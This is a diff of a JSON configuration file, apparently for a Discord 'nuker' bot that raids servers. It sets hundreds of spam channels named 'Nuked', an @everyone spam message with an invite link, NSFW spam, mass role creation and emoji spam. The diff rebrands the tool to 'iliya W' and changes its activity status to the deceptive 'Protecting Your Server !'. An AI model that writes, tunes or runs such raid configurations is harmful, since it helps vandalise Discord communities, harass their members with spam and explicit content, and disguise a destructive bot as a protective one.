@@ -1,11 +1,13 @@
 {
   "Token": "",
-  "ChannelName": ["Nuked", "EzLOL", "L Serv"],
-  "SpamMessage": "@everyone nuked using Aeries",
+  "ChannelName": ["Nuked", "Easy", "Iliya"],
+  "SpamMessage": "@everyone nuked by iliya W https://discord.gg/fjx5vwae2a",
   "ChannelAmount": "500",
   "MessageAllSpeed": "3",
-  "ActivityStatus": "discord.gg/fjx5vwae2a",
+  "ActivityStatus": "Protecting Your Server !",
   "NsfwSpam": "3",
   "RoleSpamAmount": "100",
-  "RoleSpamName": "water"
+  "RoleSpamName": "iliya W",
+  "EmojiName": "balls",
+  "EmojiSpamAmount": "31"
 }
